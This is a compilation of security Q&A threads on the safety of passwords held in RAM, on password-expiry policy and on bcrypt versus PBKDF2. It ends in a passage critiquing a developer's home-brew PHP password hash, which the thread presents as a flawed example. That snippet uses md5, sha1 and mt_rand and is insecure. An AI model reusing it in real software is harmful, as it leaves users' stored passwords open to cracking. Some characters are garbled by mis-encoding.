I think the OS does its job and forbids processes from accessing each other's allocated memory. But I also think this is somehow bypassable. So I wonder if it is really safe and if there is a safer way to store passwords to ensure that foreign processes can't access them.

I didn't specify the OS or the language because my question is quite general. This is rather a computer literacy question than a specific purpose one.
AnswersKenntnis
AnswerKenntnis:
You are touching a sore point...

Historically, computers were mainframes where a lot of distinct users launched sessions and process on the same physical machine. Unix-like systems (e.g. Linux), but also VMS and its relatives (and this family includes all Windows of the NT line, hence 2000, XP, Vista, 7, 8...), have been structured in order to support the mainframe model.

Thus, the hardware provides privilege levels. A central piece of the operating system is the kernel which runs at the highest privilege level (yes, I know there are subtleties with regards to virtualization) and manages the privilege levels. Applications run at a lower level and are forcibly prevented by the kernel from reading or writing each other's memory. Applications obtain RAM by pages (typically 4 or 8 kB) from the kernel. An application which tries to access a page belonging to another application is blocked by the kernel, and severely punished ("segmentation fault", "general protection fault"...).

When an application no longer needs a page (in particular when the application exits), the kernel takes control of the page and may give it to another process. Modern operating systems "blank" pages before giving them back, where "blanking" means "filling with zeros". This prevents leaking data from one process to another. Note that Windows 95/98/Millenium did not blank pages, and leaks could occur... but these operating system were meant for a single user per machine.

Of course, there are ways to escape the wrath of the kernel: a few doorways are available to applications which have "enough privilege" (not the same kind of privileges than above). On a Linux system, this is ptrace(). The kernel allows one process to read and write the memory of the other, through ptrace(), provided that both processes run under the same user ID, or that the process which does the ptrace() is a "root" process. Similar functionality exists in Windows.

The bottom-line is that passwords in RAM are no safer than what the operating system allows. By definition, by storing some confidential data in the memory of a process, you are trusting the operating system for not giving it away to third parties. The OS is your friend, because if the OS is an enemy then you have utterly lost.



Now comes the fun part. Since the OS enforces a separation of process, many people have tried to find ways to pierce these defenses. And they found a few interesting things...


The "RAM" which the applications see is not necessarily true "memory". The kernel is a master of illusions, and gives pages that do not necessarily exist. The illusion is maintained by swapping RAM contents with a dedicated space on the disk, where free space is present in larger quantities; this is called virtual memory. Applications need not be aware of it, because the kernel will bring back the pages when needed (but, of course, disk is much slower than RAM). An unfortunate consequence is that some data, purportedly held in RAM, makes it to a physical medium where it will stay until overwritten. In particular, it will stay there if the power is cut. This allows for attacks where the bad guy grabs the machine and runs away with it, to inspect the data later on. Or leakage can occur when a machine is decommissioned and sold on eBay, and the sysadmin forgot to wipe out the disk contents.

Linux provides a system called called mlock() which prevents the kernel from sending some specific pages to the swap space. Since locking pages in RAM can deplete available RAM resources for other process, you need some privileges (root again) to use this function.

An aggravating circumstance is that it is not necessarily easy to keep track of where your password is really in RAM. As a programmer, you access RAM through the abstraction provided by the programming language. In particular, programming languages which use Garbage Collection may transparently copy objects in RAM (because it really helps for many GC algorithms). Most programming languages are thus impacted (e.g. Java, C#/.NET, Javascript, PHP,... the list is almost endless).
Hibernation brings back the same issues, with a vengeance. By nature, hibernation must write the whole RAM to the disk -- this includes pages which were mlocked, and even the contents of the CPU registers. To avoid leaks through hibernation, you have to resort to drastic measures like encrypting the whole disk -- this naturally implies typing the unlock password whenever you awake the machine.
The mainframe model assumes that it can run several process which are hostile to each other, and yet maintain perfect peace and isolation. Modern hardware makes that very difficult. When two process run on the same CPU, they share some resources, including cache memory; memory accesses are much faster in the cache than elsewhere, but cache size is very limited. This has been exploited to recover cryptographic keys used by one process, from another. Variants have been developed which use other cache-like resources, e.g. branch prediction in a CPU. While research on that subject concentrates on cryptographic keys, which are high-value secrets, it could really apply to just any data.

On a similar note, video cards can do Direct Memory Access. Whether DMA cannot be abused to read or write memory from other process depends on how well undocumented hardware, closed-source drivers and kernels collaborate to enforce the appropriate access controls. I would not bet my last shirt on it...




Conclusion: yes, when you store a password in RAM, you are trusting the OS for keeping that confidential. Yes, the task is hard, even nigh impossible on modern systems. If some data is highly confidential, you really should not use the mainframe model, and not allow potentially hostile entities to run their code on your machine.

(Which, by the way, means that hosted virtual machines and cloud computing cannot be ultimately safe. If you are serious about security, use dedicated hardware.)
AnswerKenntnis:
I think the OS do his jobs and avoid processes to access other's allocated memory. But I think this is somehow doable. 


Yes, it is possible to access the memory of another process. On Windows, this amounts to having SE_DEBUG_PRIVILEGE and using ReadProcessMemory() to extract the information you want.

You can do the same thing from a Windows Driver, although it is a tad harder to get right due to some complications with what memory is currently paged in to the lower half.

In either case, you need to have access to an administrative account, or a process incorrectly assigned SE_DEBUG_PRIVILEGE, or a process with this privilege that can be persuaded to do what you need.

So, it comes down to ensuring nobody can escalate to obtain these privileges. More realistically, we ensure only trusted users can have these privileges. If you have access to an administrative account, you can quite easily read a password straight out of another account's processes' memory.

Under linux, you can achieve the same thing with ptrace() and the PTRACE_PEEK_DATA option.

You might ask why these functions exist in the first place? Actually, they're incredibly handy for debugging processes. Conceivably, this is something an administrator user may wish to do. By constrast, normal users should not need to and should be isolated from each other.

This is why people have advised, for some time, that running everything under the Administrator account is generally not a great idea.
AnswerKenntnis:
I work in the consumer electronics arena and security here is somewhat different than in the server environment. Here we have to assume that the product is in a hostile environment. So for subscriber management purposes keys are kept secure. The first line of defence is that the SoC has hidden registers that even the operating system can't actually access, they are burnt in at manufacture time and chip-fuses are blown which prevent access. Also we don't see keys ourselves because that would be insecure on the production floor, instead they are pre-packaged with a batch key that we don't know, only the chip vendor and person who created the key knows that (the master key can be destroyed after use in the chip). Once the chip is loaded with secrets then it can be locked and never* unlocked.

If you can't access the keys then how do you decrypt anything? With a cryptographic co-processor on the SoC you can load key positions without actually knowing the value inside. You also don't see the microcode of the crypto-processor, ever, because then even at the time of manufacture you can't inject anything. 

If you have keys or certs that won't fit into the generous chip registers then you have to store them in RAM and/or NVM, but because of the crypto-processor you don't need to expose those values. They RAM or NVM itself can be scrambled by the chip with a key which is not known by anyone but itself.

Lastly unlike in computers, secure embedded systems also have some physical security. RAM connection tracks aren't permitted to be on the surface of the PCB ("buried vias"). This is because if there are elements which are in the clear in RAM then you need to limit access, it is possible to slow down or freeze the CPU and then probe the RAM. 

Finally for smart cards it has been possible to intercept the transactions between the SoC and the card. This is called "Card sharing", the solution to this is to encrypt the transactions between the card and the SoC and bind them to each other so they can't be swapped or shared.

I know that DRM/content security is unpopular with some people on the interwebs, but I thought I would share some high-level concepts from an industry which has some particular security requirements.

*In theory.
AnswerKenntnis:
There is some work being done on the Linux platform to disallow accessing memory of a running process, even by a superuser. With SELinux, you can do it starting with Fedora 17: SELinux Deny Ptrace.
AnswerKenntnis:
What language/platform are you using?

If it's .NET, check out the PasswordBox control and the SecureString class. 

The SecureString class represents a way to store the password in memory without making it accessible to anyone - even hackers who sneak peeks at your application's memory.

The PasswordBox control is a textbox that incorporates the SecureString, so you can keep the password safe and secure from end-to-end.
AnswerKenntnis:
No, passwords stored in plaintext in RAM shouldn't be considered as safe. Generally, on the x86 and x86-64 architectures with interfaces such as FireWire, ExpressCard and Thunderbolt which directly access, these interfaces can be used to bypass operating system memory protection, and thus get plaintext passwords from memory. 

Using FireWire to gain plaintext passwords isn't simply a theoretical attack. Software is now being sold to get plaintext passwords for BitLocker, PGP and TrueCrypt encrypted disks ElcomSoft Decrypts BitLocker, PGP and TrueCrypt Containers

There's a separate thread on security.stackexchange that touches on how to mitigate DMA base attacks Safely disable firewire/thunderbolt, patching up DMA exposure under Linux. Also Microsoft have a knowledge base article to mitigate attacks via Firewire and Thunderbolt on BitLocker Blocking the SBP-2 driver and Thunderbolt controllers to reduce 1394 DMA and Thunderbolt DMA threats to BitLocker

More details on this attack can be found on Wikipedia DMA attack.
AnswerKenntnis:
In addition to all the software attacks exploiting OS vulnerabilities if an attacker has physical access to your machine they can potentially read your keys directly out of your memory.

How can the impact of cold boot attacks be minimized?
AnswerKenntnis:
You raise a valid issue and indeed this is often addressed in security-related software. When sensitive objects such as keys are no longer needed, some programs will not simply hand the memory back to the memory management library or operating system, but first obliterate the sensitive bits by overwriting them.

Of course, some programs need to hold keys persistently. For example ssh-agent. So these programs are vulnerable.  If you're a plain user on a multi-user machine, your ssh-agent's dynamic memory is vulnerable to anyone who has root privs and can see any part of the machine's memory.

And anyway, even programs that use keys briefly still have a window of vulnerability.  A microsecond can be an eternity in CPU time.  A malicious superuser could even pause the program indefinitely on some instruction, while that program has sensitive data in plain-text form somewhere in memory.

So, as a rule of thumb, do not perform any security-sensitive computing on machine if that machine has any users or software you do not trust, and an operating system that you do not trust to prevent those users or software from escalating their privilege such that they can peek at your keys or plaintext data.

When using any secure client, you're trusting that program, and the entire platform it runs on down to the hardware and every machine instruction in every program that came preinstalled or that you installed afterward.

(The so-called "trusted computing" does not fix this; it just changes who the villains are.)
AnswerKenntnis:
Even if the keys are encrypted, cod boot attack can retrieve your password:
Check this video of the cold boot attack underway..
http://www.youtube.com/watch?v=JDaicPIgn9U
AnswerKenntnis:
There is a certain amount of trust that will always have to exist with the security of the OS and applications running, unless of course you have the time to read all the source code and verify no exploits exist.  If you had that time, no trust is necessary, you'd know.  But that's not probable.  If it all possible, it's best to run proprietary projects on one machine and keep anything that must be trusted running on an another machine.  The physical separation does the trick  pretty well vs. faith based solutions.
AnswerKenntnis:
A somewhat relevant study is what needs to be done to make sure that even the superuser can not access a secret that is stored in the memory of some other process. I never really finished the endeavour, so it is only a starting point. And this does nothing to prevent any physical attacks such as cold boot attacks.

Keeping secrets from root on Linux
AnswerKenntnis:
This does not solve your problem, though one trick you can use to minimize the time a password or another secret is stored in memory is to it zero out afterwards.

Beware to use a method that guarantees you are writing to the same memory instead of allocating a new object with a different value. For example, in Java you would use a byte[] instead of a String to hold a secret.
AnswerKenntnis:
Given that this could apply to a number of OSes with varying protection levels, a few things to keep in mind:


No matter what, you cannot stop a password from being in memory at some point. If someone has live access to the memory of your application, you cannot stop them from seeing it.
Passwords are generally more valuable than just what they protect - users reuse passwords, and by accepting password login you are taking on some level of responsibility for keeping their password secret, even if the data it protects is compromised. You can somewhat mitigate the damage of an attack on cold memory (liquid nitrogen or hibernate) by hashing your users password with a slow hash function (PBKDF, scrypt, bcrypt) and using the hash for authentication. 
Clearing your users password from memory is good practice. There are many pitfalls involved in doing this properly, so make sure to use an appropriate library: Windows Linux Example
QuestionKenntnis:
How does changing your password every 90 days increase security?
qn_description:
Where I work I'm forced to change my password every 90 days.  This security measure has been in place in many organizations for as long as I can remember.  Is there a specific security vulnerability or attack that this is designed to counter, or are we just following the procedure because "it's the way it has always been done"?

It seems like changing my password would only make me more secure if someone is already in my account.


  This question was IT Security Question of the Week.
  Read the Jul 15, 2011 blog entry for more details or submit your own Question of the Week.
AnswersKenntnis
AnswerKenntnis:
The reason password expiration policies exist, is to mitigate the problems that would occur if an attacker acquired the password hashes of your system and were to break them. These policies  also help minimize some of the risk associated with losing older backups to an attacker.

For example, if an attacker were to break in and acquire your shadow password file, they could then start brute forcing the passwords without further accessing the system.  Once they know your password, they can access the system and install whatever back doors they want unless you happen to have changed your password in the time between the attacker acquiring the shadow password file and when they are able to brute force the password hash.  If the password hash algorithm is secure enough to hold off the attacker for 90 days, password expiration ensures that the attacker won't gain anything of further value from the shadow password file, with the exception of the already obtained list of user accounts.

While competent admins are going to secure the actual shadow password file, organizations as a whole tend to be more lax about backups, particularly older backups.  Ideally, of course, everyone would be just as careful with the tape that has the backup from 6 months ago as they are with the production data.  In reality, though, some older tapes inevitably get misplaced, misfiled, and otherwise lost in large organizations.  Password expiration policies limit the damage that is done if an older backup is lost for the same reason that it mitigates the compromise of the password hashes from the live system.  If you lose a 6 month old backup, you are encrypting the sensitive information and all the passwords have expired since the backup was taken, you probably haven't lost anything but the list of user accounts.
AnswerKenntnis:
I have argued before that it doesn't improve anything. From that post:


  Obviously the attacker does not know
  your password a priori, or the attack
  wouldnΓÇÖt be brute-force; so the guess
  is independent of your password. You
  donΓÇÖt know what the attacker has,
  hasnΓÇÖt, or will next testΓÇöall you know
  is that the attacker will exhaust all
  possible guesses given enough time. So
  your password is independent of the
  guess distribution.
  
  Your password, and the attackerΓÇÖs
  guess at your password, are
  independent. The probability that the
  attackerΓÇÖs next guess is correct is
  the same even if you change your
  password first. Password expiration
  policies cannot possibly mitigate
  brute-force attacks.
  
  So why do we enforce password
  expiration policies? Actually, thatΓÇÖs
  a very good question. LetΓÇÖs say an
  attacker does gain your password.
  
  The window of opportunity to exploit
  this condition depends on the time for
  which the password is valid, right?
  Wrong: as soon as the attacker gains
  the password, he can install a back
  door, create another account or take
  other steps to ensure continued
  access. Changing the password post
  facto will defeat an attacker who
  isnΓÇÖt thinking straight, but
  ultimately a more comprehensive
  response should be initiated.
  
  So password expiration policies annoy
  our users, and donΓÇÖt help anyone.
AnswerKenntnis:
Before answering, whether it does help or it does not help, it makes sense to look at specific scenarios. (That's often a good idea when dealing with security measurements)

In what situations does a forced-password-change mitigate impact?

The attacker knows the password of a user but has no backdoor. He does not want to be discovered, so he does not change the password himself.

Let's see if this scenario is likely:

How might he have learned the password?


The victim might have told him (e. g. a new intern who should start working before he gets his own account setup, another person who should level an account in an online game
The attacker might have watched the keyword
The attacker might have had access to another password database in which the user used the same password
A one time only login using a computer owned (prepared) by an attacker.


What might have prevented him from setting up a backdoor?


The service in question may not provide a way for backdoors, for example an email inbox or common web applications
The privileges of the user may not have sufficient permission to install a backdoor
The attacker might miss the required knowledge (in the online game Stendhal most "hacks" are done by angry siblings who just want to destroy some toy)
The attacker might not have turned evil, yet. (e. g. an employee that will be fired next month but does not suspect anything at the moment).


Why not use forced password expire?

It can be very annoying to users causing them to just add a counter at the end. This might decrease the entropy of passwords. According to my experience it generates additional support costs because people forget their new password more often than usual. I guess that is caused by the change password prompt catching them off guard while they are busy thinking about something else.

To conclude

It is far from a cure-all and it has a negative impact on usability, but it does make sense to balance that against the likelyhood and impact of scenarios similar to the one I described above.
AnswerKenntnis:
There was a study by Microsoft concluding the password expiration policy does not increase the security in real life scenarios.

These articles were removed, but available on the Internet Archive:


Please do not change your password 
Study: Frequent password changes are useless


Original: So Long, And No Thanks for the Externalities:
The Rational Rejection of Security Advice by Users
AnswerKenntnis:
We all have our opinions, but we should also be looking for actual research on the question.  Besides the paper by Cormac Herley of Microsoft on website passwords noted in Suma's answer, there is a paper from ACM CCS 2010: "The Security of Modern Password Expiration: An Algorithmic Framework and Empirical Analysis" (pdf), written by Yinqian Zhang, Fabian Monrose and Michael Reiter. They analyzed a great dataset and did some good analysis on how effective password expiration policies really are.  Their conclusion?  Forcing users to change their password every six months isn't very useful:


  at least 41% of passwords can be broken of∩¼éine from previous passwords for the same accounts in a matter of seconds, and ∩¼üve online
  password guesses in expectation suf∩¼üces to break 17% of accounts.
  
  ....our evidence suggests it may be appropriate to do away with password expiration altogether, perhaps as a concession while requiring
  users to invest the effort to select a signi∩¼ücantly stronger password
  than they would otherwise (e.g., a much longer passphrase). ....
  
  In the longer term, we believe our study supports the conclusion that simple password-based authentication should be abandoned outright


For research on how to help users choose stronger passwords, see Recommended policy on password complexity - IT Security
AnswerKenntnis:
One reason not mentioned here, is that it prevents people who use the same password for everything from getting your system compromised if their password is figured out somewhere else. After a few passwords expire, users will start to have to come up with original passwords, which means when their favourite password is stolen and all their emails, social networking sites, and personal accounts get hacked, your system will still be secure.
AnswerKenntnis:
The only two good reasons I have heard:


Window of opportunity - in an on-line attack scenario say you lockout the account for 30 minutes after 10 incorrect attempts (the Microsoft recommended setting for high security environments). Without any password expiry there is potentially an unlimited time window to attempt dictionary, brute-force, common passwords attack methods. Password expiry caps that. In an off-line scenario, where you do not realize your passwords have been stolen, again expiring passwords provides the attacker limited window of time to crack the passwords before they become useless. Of course as @graham-lee states you need other controls in place to detect things like a back-door
Compliance - virtually every regulator and auditor will look for password expiry. Including PCI-DSS, HIPAA, SOX, Basel II, etc. Correctly or incorrectly this is the world we live in. In addition the "no one got fired for buying IBM theory". If you do not have password expiry and others in your industry do, if you get hacked, then you were not following "industry standard practices". More importantly senior management cannot say this to the press, to a regulator, to a court. Same reason for having state-full inspection firewalls, anti-virus, IDS even though they are less effective now than 10 years ago. 


That said as everyone has said password change is terrible for user experience, especially where there is no or limited single sign-on it can lead to "password change day" where a user goes through and changes the password for their 30 systems to the same one usually by incrementing a digit. This is clearly not desired behavior. My recommendation for changing this culture if it is possible in your regulatory / audit environment is to change your policy to remove password expiry with a clear justification (plenty here). Get this approved by the appropriate security governance and reviewed by audit / regulator. Then go ahead and change the systems. Alternatively use more single sign-on and federated ID, ideally with two factor, so that at least users only need to change one or a few passwords.
AnswerKenntnis:
Simple answer - these days it almost never helps. Previous answers give the main two scenarios where it will, but even then, 90 days is still not that useful.

It could be worse - we spent ages persuading people that 30 days was too short but back in the day when stealing the SAM was relatively easy folks were very worried about a brute force attack on the SAM. We got many companies to agree on a compromise of 90 days but although cracking power has definitely gone up, hashes are better protected and generally most places now have at least some password complexity rules in place so it has become far less important.
AnswerKenntnis:
How much will an expiration of passwords improve security?


This image shows, for some scenarios, the relation between time and the probability, that a brute force attack on a type of password succeeded, depending on the regular change of the password. 
The absolute timespan is of minor interest. How long it is - either there is not much difference, or the vulnerability is already pretty high.

As mentioned from others before, there are different scenarios, where changing the password might help:


a) User A tells a coworker B his password in a special situation. Later B is fired. He now might think about misusing the password of A (his own account is deleted, we assume), but it could need some time (losing a dispute against the company in court, for example) before starting his attack. Here, it is very useful, to change the password - but of course not from secret2010 to secret2011. 
b) Attacker has access to the shadow file, and is brute forcing with certain amount of CPU-power (or GPU).


In the case b), the policy to change the password, looks reasonable, but you do only profit, if the risk to be vulnerable is already really high. Let me explain it with numbers: 

Assume an attacker might try 250 000 passwords per second.
Assume you say the password expires after 183 days, (about 6 months).
The password is generated from a-zA-Z0-9 which is 62 signs.
Assume the password is 8 signs long.
Check how probable is a breakin after 10 year, which is 20 change intervals.

I've written a program, to test different parameters; call the program with

java PasswordCrackProb 8 62 250000 s 183 20

len             = 8
signs           = 62
attacks per day = 21 600 000 000
change after days= 183
intervals       = 20    days = 3660 years = 10
M               = 218 340 105 584 896
attacks         = 79 056 000 000 000
p(cracked)      = 0,3620773 without change
p(cracked)      = 0,3060774 with change


The result means, that it is cracked with 36% chance if the password wasn't changed, and with 31% if it was changed (but the attacker has a fresh shadow file). The difference is significant, and more so, if we take a longer time, 40 intervals, like 20 years: 

p(cracked)      = 0,7241546 without change
p(cracked)      = 0,5184715 with change


but while 52% is much lower than 72%, 52% might not be acceptable.
But if we look at smaller intervals, the relative difference between changed and unchanged passwords gets smaller and smaller. 

p(cracked)      = 0,0905193 without change
p(cracked)      = 0,0873006 with change


If you assume more CPU power or weaker passwords, the crack time gets smaller, of course, but the number of attacks per day is not very interesting. We have to assume: We can not enforce the user to change the password on a daily basis. So some days - maybe a week - is the minimum. And we don't need a maximum for longer than 20 years. Systems change, people change jobs. You cannot avoid to change the password after 20 years.

If the attacker has too much power, and brute forces the whole namespace in a single day, a weekly change won't help you much - he always wins.  And if the attacker can only brute force 1% of the namespace (for a given password length) in 50 years, it doesn't help as well, to change the password - you will (nearly) always win.

Only in an intermediate, balanced scenario, the password change could make a difference, but do you really know, whether the bad guy needs 1, 10 or 100 years to brute force your password? 

But keep in mind: If the attacker only once had access to your shadow file, which is now expired, the comparison from my program doesn't fit.
AnswerKenntnis:
I would just like to add one thing. We can approach to this problem from social angle.
By reseting password every X days we are telling the user - Hey, this is important and it should not be taken lightly!
AnswerKenntnis:
A major consideration to take into account when questioning this is that you may not know your account has already been breached.

If your password had become compromised, and you were aware of it, you would obviously move immediately to change it in any case.

By forcing you to change your password every 90 days (or face account suspension) administrators are mitigating two risks.
1. That inactive users/accounts will be available for unlimited amounts of time for an attacker to try and brute-force their way into.
2. That, in the event you do not you've been breached, you are forced to change your password regardless (thus re'locking' the attacker out of your account)
AnswerKenntnis:
It might seem somehow better in sense that the institution is enforcing to change passwords at some periodic interval. However, if the user is changing the passwords in the interval, but is always leaving a patter behind his changes, then it makes no sense of changing the passwords. Its more serious threat instead. The user feels he/she has changed his/her last passwords and feels safe. and the attacker is always getting a clue to the password.

-

The best way is always to suggest the service provider to implement a better and safer algorithm then asking for its end users to reset the goddamm password everytime. If someone is same enough he/she will have in mind that these days we have Single Sign On, and OpenID, where people prefer to login with one accounts rather than remembering different passwords for different websites.

-
Despite of all the discussions, its recommended to change your password frequently, 
But, 

On YOUR FREE WILL


A Quick Tip : Use multiple words in your password (The safest marked till date).
AnswerKenntnis:
Most online services (e.g. Banks) limit the number of online attempts per time unit, rendering a brute force attack futile.

The result of a password-change policy is almost always a security risk. It can take the form of a PostIt password, or passwords that take the form pass!1000, changed to pass!1001, then to pass!1002 and so on.
AnswerKenntnis:
I personally don't think that enforcing password expiration on office users (or, people hardly familiar with computer use, let alone cyber security) is a good idea in the form as it is done in many organizations. As it was noted above, the major security flaw in this case is that those same office users simply write their passwords on sticky notes and paste them to their screens or stick them in their desks. Or, if the person is slightly more "advanced", they may start using passwords such as letmeinMONTHYEAR.

Nonetheless, periodic password expiration is a good thing, once it's coupled with the proper password management. Obviously most (non-savant) people will not be able to remember really secure passwords -- something like *v^i77u*UNoMTYPGAm$*. So what shall we do?

I personally use a password manager that tracks all of my passwords, except one, the master password. This really simplifies things and makes them way more secure (provided my master password is secure itself and I can easily recount it to log in to the password manager.) There're several commercial password managers, which I will let you discover and test for yourselves. I personally use Lastpass which is free for general use and is secure. It is available via the web browser and can be also installed as an app on your smartphone or tablet. As for security concerns of letting a third-party solution manage all of your passwords, I rely on the vetting done by Steve Gibson. You can watch the full version of it here.
AnswerKenntnis:
Lost, misplaced or stolen hardware can also be a attack vector providing access to at best obfuscated passwords.

Attacker can steal a smartfone and recover passwords to WiFi -- in most places the general user account.
AnswerKenntnis:
A strict literal reading of the question leads to the answer:  It increase security in a negative way:  either through post-it notes or using increasing numbers or shift-number.

It might decrease the risk of legal issues from compliance, however.
AnswerKenntnis:
We rotate 'public passwords' (guest wifi) to flush out access of employee's who have since left the company.

We accept the burdens of rotating 'individual passwords', because a) we always start with the assumption that every non-techie's accounts have already been hacked.
And b) to 'automaticaly close' all accounts which have been forgotten.
Since the 'centralized set new password' access is the only one we never forget to close. (fail-safe expiry of all single-signon dependencies)
This also includes hardware (notebooks) that are handed to a new owner, and might have 'saved passwords'.

(c) Plus, it makes people stay aware of where their passwords are auto-saved.)

(d) Plus, we can tell people to 'please change all your passwords', after a questionable data-loss. That only works reliably with employess who have been trained at password-changing.)

In short, automatic expiry is a safe-guard against people not behaving as you asked them to do.
AnswerKenntnis:
A forced change of passwords prevents password reuse. Many lazy people have a few passwords they always use, even for forums or FTP servers. An attacker could use this knowledge to search for these passwords on insecure domains.

If you often change your passwords in high security environments this type of vulnerability gets irrelevant.

Furthermore password changes are an easy method to verify if an account is still in use. If nobody logs in within the required 90 days the account gets disabled. If there is no purpose for logging in like a password change people tend to forget to keep their accounts active.
QuestionKenntnis:
Do any security experts recommend bcrypt for password storage?
qn_description:
On the surface bcrypt, an 11 year old security algorithm designed for hashing passwords by Niels Provos and David Mazieres, which is based on the initialization function used in the NIST approved blowfish algorithm seems almost too good to be true. It is not vulnerable to rainbow tables (since creating them is too expensive) and not even vulnerable to brute force attacks. 

However 11 years later, many are still using SHA2x with salt for storing password hashes and bcrypt is not widely adopted. 


What is the NIST recommendation with regards to bcrypt (and password hashing in general)? 
What do prominent security experts (such as Arjen Lenstra and so on) say about using bcrypt for password hashing?
AnswersKenntnis
AnswerKenntnis:
Bcrypt has the best kind of repute that can be achieved for a cryptographic algorithm: it has been around for quite some time, used quite widely, "attracted attention", and yet remains unbroken to date.

Why bcrypt is somewhat better than PBKDF2

If you look at the situation in details, you can actually see some points where bcrypt is better than, say, PBKDF2. Bcrypt is a password hashing function which aims at being slow. To be precise, we want the password hashing function to be as slow as possible for the attacker while not being intolerably slow for the honest systems. Since "honest systems" tend to use off-the-shelf generic hardware (i.e. "a PC") which are also available to the attacker, the best that we can hope for is to make password hashing N times slower for both the attacker and for us. We then adjust N so as not to exceed our resources (foremost of which being the user's patience, which is really limited).

What we want to avoid is that an attacker might use some non-PC hardware which would allow him to suffer less than us from the extra work implied by bcrypt or PBKDF2. In particular, an industrious attacker may want to use a GPU or a FPGA. SHA-256, for instance, can be very efficiently implemented on a GPU, since it uses only 32-bit logic and arithmetic operations that GPU are very good at. Hence, an attacker with 500$ worth of GPU will be able to "try" many more passwords per hour than what he could do with 500$ worth of PC (the ratio depends on the type of GPU, but a 10x or 20x ratio would be typical).

Bcrypt happens to heavily rely on accesses to a table which is constantly altered throughout the algorithm execution. This is very fast on a PC, much less so on a GPU, where memory is shared and all cores compete for control of the internal memory bus. Thus, the boost that an attacker can get from using GPU is quite reduced, compared to what the attacker gets with PBKDF2 or similar designs.

The designers of bcrypt were quite aware of the issue, which is why they designed bcrypt out of the block cipher Blowfish and not a SHA-* function. They note in their article the following:


  That means one should make any password function as efficient as possible for the setting in which it will operate. The designers of crypt failed to do this. They based crypt on DES, a particularly inefficient algorithm to implement in software because of many bit transpositions. They discounted hardware attacks, in part because crypt cannot be calculated with stock DES hardware. Unfortunately, Biham later discovered a software technique known as bitslicing that eliminates the cost of bit transpositions in computing many simultaneous DES encryptions. While bitslicing won't help anyone log in faster, it offers a staggering speedup to brute force password searches.


which shows that the hardware and the way it can be used is important. Even with the same PC as the honest system, an attacker can use bitslicing to try several passwords in parallel and get a boost out of it, because the attacker has several passwords to try, while the honest system has only one at a time.

Why bcrypt is not optimally secure

The bcrypt authors were working in 1999. At that time, the threat was custom ASIC with very low gate counts. Times have changed; now, the sophisticated attacker will use big FPGA, and the newer models (e.g. the Virtex from Xilinx) have embedded RAM blocks, which allow them to implement Blowfish and bcrypt very efficiently. Bcrypt needs only 4 kB of fast RAM. While bcrypt does a decent job at making life difficult for a GPU-enhanced attacker, it does little against a FPGA-wielding attacker.

This prompted Colin Percival to invent scrypt in 2009; this is a bcrypt-like function which requires much more RAM. This is still a new design (only two years) and nowhere nearly as widespread as bcrypt; I deem it too new to be recommended on a general basis. But its career should be followed.

What NIST recommends

NIST has issued Special Publication SP 800-132 on the subject of storing hashed passwords. Basically they recommend PBKDF2. This does not mean that they deem bcrypt insecure; they say nothing at all about bcrypt. It just means that NIST deems PBKDF2 "secure enough" (and it certainly is much better than a simple hash !). Also, NIST is an administrative organization, so they are bound to just love anything which builds on already "Approved" algorithms like SHA-256. On the other hand, bcrypt comes from Blowfish which has never received any kind of NIST blessing (or curse).

While I recommend bcrypt, I still follow NIST in that if you implement PBKDF2 and use it properly (with a "high" iteration count), then it is quite probable that password storage is no longer the worst of your security issues.
AnswerKenntnis:
bcrypt has a significant advantage over a simply salted SHA-256 hash: bcrypt uses a modified key setup algorithm which is timely quite expensive. This is called key strengthening, and makes a password more secure against brute force attacks, since the attacker now needs a lot more time to test each possible key.

In the blog post called "Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes", which I personally recommend you to read, Thomas Ptacek, the author and a security researcher recommends the usage of bcrypt.

Personally, I've been looking at PBKDF2 lately, which is a key derivation function that applies a pseudo-random function (e.g. cryptographic hash) to the input password along with a salt, and then derives a key by repeating the process as many times as specified. Although it's a key derivation function, it uses the principle of key strengthening at its core, which is one of many things you should strive for when deciding on how to securely generate a hash of a password.

To quote Thomas Ptacek from the above linked post:


  Speed is exactly what you donΓÇÖt want
  in a password hash function.
AnswerKenntnis:
I think Gui's suggestion about PBKDF2 has merit, although I know Rook disagrees strongly. If only they were clear about their reasoning!

Regardless, there's no reason to use a salted SHA-256 hash in comparison to HMAC-SHA256. HMAC has the advantage of blocking extension attacks.
AnswerKenntnis:
NIST is a United States based government organization, and thus follows FIPS (United States based) standards, which do not include blowfish, but do include SHA-256 and SHA-512 (and even SHA-1 for non-digital signature applications, even in NIST SP800-131A, which delineates how long each older algorithm can be used for what purpose).

For any business required to comply with U.S. NIST or FIPS standards, bcrypt is not a valid option.  Check every nation's laws and regulations separately if you do business there, of course.

PBKDF2 is fine; the real trick is to get Tesla (GPU based) cards in the honest servers so the iterations can be made high enough to compete with GPU based crackers.  For PBKDF2 in 2012, OWASP recommends at least 64,000 iterations on their Password Storage Cheat Sheet, doubled every 2 years.
QuestionKenntnis:
Is my developer's home-brew password security right or wrong, and why?
qn_description:
A developer, let's call him 'Dave', insists on using home-brew scripts for password security. See Dave's proposal below.

His team spent months adopting an industry standard protocol using Bcrypt.  The software and methods in that protocol are not new, and are based on tried and tested implementations that support millions of users. This protocol is a set of specifications detailing the current state of the art, software components used, and how they should be implemented. The implementation is based on a known-good implementation.

Dave argued against this protocol from day one. His reasoning was that algorithms like Bcrypt, because they are published, have greater visibility to hackers, and are more likely to be targeted for attack. He also argued that the protocol itself was too bulky and difficult to maintain, but I believe Dave's primary hangup was the fact that Bcrypt is published.

What I'm hoping to accomplish by sharing his code here, is to generate consensus on: 


Why home-brew is not a good idea, and 
What specifically is wrong with his script




/** Dave's Home-brew Hash */

// user data
$user = '';
$password = '';

// timestamp, random #
$time = date('mdYHis');
$rand = mt_rand().'\n';

// crypt
$crypt = crypt($user.$time.$rand);

// hash
function hash_it($string1, $string2) {
    $pass = md5($string1);
    $nt = substr($pass,0,8);
    $th = substr($pass,8,8);
    $ur = substr($pass,16,8);
    $ps = substr($pass,24,8);

    $hash = 'H'.sha1($string2.$ps.$ur.$nt.$th);
    return $hash
}

$hash = hash_it($password, $crypt);
AnswersKenntnis
AnswerKenntnis:
/** Dave's Home-brew Hash^H^H^H^H^Hkinda stupid algorithm */

// user data
$user = '';
$password = '';

// timestamp, "random" #
$time = date('mdYHis'); // known to attackers - totally pointless
// ^ also, as jdm pointed out in the comments, this changes daily. looks broken!

// different hashes for different days? huh? or is this stored as a salt?
$rand = mt_rand().'\n'; // mt_rand is not secure as a random number generator
// ^ it's even less secure if you only ask for a single 31-bit number. and why the \n?

// crypt is good if configured/salted correctly
// ... except you've used crypt on the username? WTF.
$crypt = crypt($user.$time.$rand); 

// hash
function hash_it($string1, $string2) {
